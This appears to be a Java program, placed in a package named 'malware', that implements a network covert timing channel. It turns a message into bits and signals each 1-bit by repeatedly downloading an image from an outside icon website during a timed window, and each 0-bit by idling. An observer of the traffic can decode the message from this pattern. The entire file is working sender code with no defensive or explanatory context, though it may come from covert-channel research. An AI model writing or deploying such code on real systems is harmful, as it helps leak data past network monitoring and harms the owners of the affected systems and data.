package malware;

import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;


public class Program {


	public static String urlStr = "http://icons.iconarchive.com/icons/hopstarter/sleek-xp-basic/256/Document-Blank-icon.png";
	public static URL url;
	public static InputStream bis;
	public static byte[] buffer = new byte[100000];






	public static void main(String[] args)   {
		String msg = args[0];
		long window = Long.parseLong(args[1]);

				try {
					url = new URL(urlStr);
					modulateMessage(msg, window);

				} catch (MalformedURLException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}



	}

	public static void modulateMessage(String message, long window) throws IOException, InterruptedException {
		int [] binarySequence = asBinarySequence(message);
		//long unix = System.currentTimeMillis() /1000L;
		//System.out.println(unix);
		for (int index = 0; index< binarySequence.length; index++){
			if (binarySequence[index] == 0)
				modulate0Bits(window);
			else
				modulate1Bits(window);
		}
	}

	public static int[] asBinarySequence(String message) {
		byte[] bytes = message.getBytes();
		StringBuilder binary = new StringBuilder();
		for (byte b : bytes)
		{
			int val = b;
			for (int i = 0; i < 8; i++)
			{
				binary.append((val & 128) == 0 ? 0 : 1);
				val <<= 1;
			}
		}
		int[] binaryAns = new int[binary.length()];
		for(int i = 0 ; i < binary.length() ; i++){
			binaryAns[i] = Integer.parseInt(binary.charAt(i)+"");
		}
		return binaryAns;
	}

	public static void modulate1Bits(long window) throws IOException
	{
		long start_Time = System.currentTimeMillis();
		while(System.currentTimeMillis() - start_Time < (window/10))
		{
		}
		bis = url.openStream();
		while(System.currentTimeMillis() - start_Time < (window*9/10))
		{
			bis.read(buffer);
		}
		bis.close();
		while(System.currentTimeMillis() - start_Time < window)
		{
		}
	}

	public static void modulate0Bits(long window){
		long start_Time = System.currentTimeMillis();
		while(System.currentTimeMillis() - start_Time < window)
		{
		}
	}
}